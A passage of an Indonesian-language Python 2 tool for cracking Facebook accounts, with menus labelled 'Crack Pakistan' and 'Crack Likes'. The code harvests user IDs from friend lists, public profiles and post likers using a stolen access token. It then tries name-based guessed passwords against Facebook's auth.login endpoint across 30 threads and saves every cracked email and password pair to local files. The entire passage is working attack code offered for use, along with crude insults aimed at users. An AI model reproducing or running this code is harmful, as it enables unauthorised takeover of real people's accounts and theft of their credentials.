                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
                                oke = open("done/usa.txt", "a")
                                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
                                oke.close()
                                oks.append(zowe)
                            else:
                                if 'www.facebook.com' in ko['error_msg']:
                                    print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
                                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
                                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
                                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos3
                                    cek = open("done/usa.txt", "a")
                                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos4 = j['first_name']+'1234'
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
                                        oke = open("done/usa.txt", "a")
                                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
                                        oke.close()
                                        oks.append(zowe)
                                    else:
                                        if 'www.facebook.com' in ko['error_msg']:
                                            print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
                                            print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
                                            print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
                                            print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos4
                                            cek = open("done/usa.txt", "a")
                                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
                                            cek.close()
                                            cekpoint.append(zowe)
                                        else:
                                            bos5 = j['first_name']+'12345'
                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                            ko = json.load(data)
                                            if 'access_token' in ko:
                                                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
                                                oke = open("done/usa.txt", "a")
                                                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
                                                oke.close()
                                                oks.append(zowe)
                                            else:
                                                if 'www.facebook.com' in ko['error_msg']:
                                                    print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
                                                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
                                                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
                                                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos5
                                                    cek = open("done/usa.txt", "a")
                                                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
                                                    cek.close()
                                                    cekpoint.append(zowe)
                                                                            
        except:
            pass
            
    p = ThreadPool(30)
    p.map(main, id)
    print "\n\033[1;94m──────────────────────────────────────────────────"
    print '\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mcape smlurt, gaada lagi '
    print"\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mTotal \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
    print '\033[1;97m{\033[1;95m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;95mSudah disimpan di \033[1;91m: \033[1;92mdone/usa.txt'
    print 50* "\033[1;94m─"
    raw_input("\033[1;97m{<\033[1;95mbalik?\033[1;97m>}")
    os.system("python2 mulung.py")
    
##### CRACK PAKISTAN #####
def crack_pakis():
    global toket
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;96m[!] \x1b[1;91mTokennya gabener nih asw"
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    os.system('clear')
    print logo
    print 50* "\033[1;94m─"
    print "\033[1;97m{\033[1;91m01\033[1;97m} Mulung Dari Daftar Teman"
    print "\033[1;97m{\033[1;91m02\033[1;97m} Mulung Dari Publik/Teman"
    print "\033[1;97m{\033[1;91m03\033[1;97m} Mulung Dari File"
    print "\033[1;97m{\033[1;91m00\033[1;97m} balik?"
    print 50* "\033[1;94m─"
    pilih_pakis()

#### PILIH PAKISTAN ####
def pilih_pakis():
    teak = raw_input("\033[1;91mmahwu yang mana ? \033[91m:\033[1;92m ")
    if teak =="":
        print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Gaada opsi itu smlur"
        pilih_pakis()
    elif teak =="1" or teak =="01":
        os.system('clear')
        print logo
        print 50* "\033[1;94m─"
        print ("             \033[1;91m●●● \033[1;97mCRACK PAKISTAN \033[1;91m●●●")
        print 50* "\033[1;94m─"
        r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])
    elif teak =="2" or teak =="02":
        os.system('clear')
        print logo
        print 50* "\033[1;94m─"
        print ("             \033[1;91m●●● \033[1;97mCRACK PAKISTAN \033[1;91m●●●")
        print 50* "\033[1;94m─"
        idt = raw_input("\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mID Publik/Teman \033[1;91m:\033[1;92m ")
        try:
            jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            op = json.loads(jok.text)
            print"\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mNama \033[1;91m:\033[1;92m "+op["name"]
        except KeyError:
            print"\033[1;97m{\033[1;91m!\033[1;97m} ID publik/teman tidak ada !"
            raw_input("\n\033[1;91m[\033[1;97m<balik?>\033[1;91m]")
            crack_pakis()
        except requests.exceptions.ConnectionError:
            print"\033[1;97m{\033[1;91m!\033[1;97m} Tidak ada koneksi !"
            keluar()
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    elif teak =="3" or teak =="03":
        os.system('clear')
        print logo
        try:
            print 50* "\033[1;94m─"
            print ("             \033[1;91m●●● \033[1;97mCRACK PAKISTAN \033[1;91m●●●")
            print 50* "\033[1;94m─"
            idlist = raw_input('\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mNama File\033[1;91m :\033[1;92m ')
            for line in open(idlist,'r').readlines():
                id.append(line.strip())
        except KeyError:
            print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada ! '
            raw_input('\n\033[1;92m[ \033[1;97mbalik? \033[1;92m]')
        except IOError:
            print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada !'
            raw_input("\n\033[1;91m[\033[1;97m<balik?>\033[1;91m]")
            crack_pakis()
    elif teak =="0" or teak =="00":
        menu()
    else:
        print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Gaada opsi itu smlur"
        pilih_pakis()
    
    print "\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mTotal ID \033[1;91m:\033[1;92m "+str(len(id))
    print('\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mStop Tekan CTRL+Z')
    titik = ['.   ','..  ','... ']
    for o in titik:
        print("\r\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mSedang Jadi hemker ea mhank "+o),;sys.stdout.flush();time.sleep(1)
    print("\n\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mPake in mode pesawat kalo ga done,kalo ga buang aja hp nya kontol")
    print ("\033[1;94m──────────────────────────────────────────────────")
    
##### MAIN PAKISTAN #####
    def main(arg):
        sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
        global cekpoint,oks
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower()+'123'
            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            ko = json.load(data)
            if 'access_token' in ko:
                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
                oke = open("done/pakis.txt", "a")
                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
                oke.close()
                oks.append(zowe)
            else:
                if 'www.facebook.com' in ko['error_msg']:
                    print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
                    print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
                    print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
                    print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos1
                    cek = open("done/pakis.txt", "a")
                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos2 = j['first_name'].lower()+'1234'
                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
                        oke = open("done/pakis.txt", "a")
                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
                        oke.close()
                        oks.append(zowe)
                    else:
                        if 'www.facebook.com' in ko['error_msg']:
                            print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
                            print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
                            print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
                            print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos2
                            cek = open("done/pakis.txt", "a")
                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos3 = j['first_name'].lower()+'12345'
                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
                                oke = open("done/pakis.txt", "a")
                                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
                                oke.close()
                                oks.append(zowe)
                            else:
                                if 'www.facebook.com' in ko['error_msg']:
                                    print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
                                    print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
                                    print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
                                    print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos3
                                    cek = open("done/pakis.txt", "a")
                                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos4 = ('pakistan')
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
                                        oke = open("done/pakis.txt", "a")
                                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
                                        oke.close()
                                        oks.append(zowe)
                                    else:
                                        if 'www.facebook.com' in ko['error_msg']:
                                            print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
                                            print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
                                            print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
                                            print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos4
                                            cek = open("done/pakis.txt", "a")
                                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
                                            cek.close()
                                            cekpoint.append(zowe)
                                        else:
                                            bos5 = ('786786')
                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                            ko = json.load(data)
                                            if 'access_token' in ko:
                                                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
                                                oke = open("done/pakis.txt", "a")
                                                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
                                                oke.close()
                                                oks.append(zowe)
                                            else:
                                                if 'www.facebook.com' in ko['error_msg']:
                                                    print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
                                                    print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
                                                    print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
                                                    print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos5
                                                    cek = open("done/pakis.txt", "a")
                                                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
                                                    cek.close()
                                                    cekpoint.append(zowe)
                                                else:
                                                    bos6 = j['last_name'].lower()+'786'
                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                    ko = json.load(data)
                                                    if 'access_token' in ko:
                                                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos6
                                                        oke = open("done/pakis.txt", "a")
                                                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
                                                        oke.close()
                                                        oks.append(zowe)
                                                    else:
                                                        if 'www.facebook.com' in ko['error_msg']:
                                                            print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
                                                            print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
                                                            print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
                                                            print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos6
                                                            cek = open("done/pakis.txt", "a")
                                                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
                                                            cek.close()
                                                            cekpoint.append(zowe)
                                                        else:
                                                            bos7 = j['last_name'].lower()+'123'
                                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                            ko = json.load(data)
                                                            if 'access_token' in ko:
                                                                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos7
                                                                oke = open("done/pakis.txt", "a")
                                                                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
                                                                oke.close()
                                                                oks.append(zowe)
                                                            else:
                                                                if 'www.facebook.com' in ko['error_msg']:
                                                                    print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
                                                                    print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
                                                                    print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
                                                                    print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos7
                                                                    cek = open("done/pakis.txt", "a")
                                                                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
                                                                    cek.close()
                                                                    cekpoint.append(zowe)
                                                                else:
                                                                    bos8 = j['last_name'].lower()+'1234'
                                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                    ko = json.load(data)
                                                                    if 'access_token' in ko:
                                                                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos8
                                                                        oke = open("done/pakis.txt", "a")
                                                                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
                                                                        oke.close()
                                                                        oks.append(zowe)
                                                                    else:
                                                                        if 'www.facebook.com' in ko['error_msg']:
                                                                            print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
                                                                            print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
                                                                            print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
                                                                            print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos8
                                                                            cek = open("done/pakis.txt", "a")
                                                                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
                                                                            cek.close()
                                                                            cekpoint.append(zowe)
                                                                            
        except:
            pass
            
    p = ThreadPool(30)
    p.map(main, id)
    print "\n\033[1;94m──────────────────────────────────────────────────"
    print '\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mcape smlurt, gaada lagi '
    print"\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mTotal \033[1;92mOK\033[1;97m/\x1b[1;91mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
    print '\033[1;97m{\033[1;91m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;91mCP \033[1;91mSudah disimpan di \033[1;91m: \033[1;92mdone/pakis.txt'
    print 50* "\033[1;94m─"
    raw_input("\033[1;97m{<\033[1;91mbalik?\033[1;97m>}")
    os.system("python2 mulung.py")
    
##### CRACK LIKES #####
def crack_likes():
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;97m[!] Tokennya gabener nih asw"
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    try:
        os.system('clear')
        print logo
        print 50* "\033[1;94m─"
        print ("        \033[1;96m●●● \033[1;97mCRACK POSTINGAN GRUP/TEMAN\033[1;96m ●●●")
        print 50* "\033[1;94m─"
        tez = raw_input("\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m ID Postingan Group/Teman \033[1;91m :\033[1;92m ")
        r = requests.get("https://graph.facebook.com/"+tez+"/likes?limit=9999999&access_token="+toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
        jalan('\r\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mMengambil ID \033[1;97m...')
    except KeyError:
        print"\033[1;97m{\033[1;91m!\033[1;97m} ID Postingan Salah !"
        raw_input("\n\033[1;96m[<\033[1;97mbalik?>\033[1;96m]")
        menu()
        
    print "\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mTotal ID \033[1;91m:\033[1;92m "+str(len(id))
    print('\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mStop Tekan CTRL+Z')
    titik = ['.   ','..  ','... ']
    for o in titik:
        print("\r\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mSedang Jadi hemker ea mhank "+o),;sys.stdout.flush();time.sleep(1)
    print("\n\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mPake in mode pesawat kalo ga done,kalo ga buang aja hp nya kontol")
    print ("\033[1;94m──────────────────────────────────────────────────")
    
##### MAIN LIKES #####
    def main(arg):
        sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
        global cekpoint,oks
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower()+'123'
            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            ko = json.load(data)
            if 'access_token' in ko:
